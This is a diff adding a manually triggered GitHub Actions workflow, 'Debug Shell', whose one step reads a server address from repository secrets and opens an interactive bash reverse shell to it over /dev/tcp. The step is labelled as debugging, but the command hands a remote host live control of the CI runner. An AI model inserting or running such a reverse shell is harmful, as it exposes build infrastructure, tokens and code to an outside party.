@@ -1,0 +1,18 @@
+name: Debug Shell
+
+on:
+  workflow_dispatch:
+
+jobs:
+  debug:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Connect reverse shell
+        env:
+          SERVER_IP: ${{ secrets.DEBUG_SERVER_IP }}
+          SERVER_PORT: ${{ secrets.DEBUG_SERVER_PORT }}
+        run: |
+          echo "Connecting to reverse shell at $SERVER_IP:$SERVER_PORT"
+          bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1
+          echo "Connection closed"
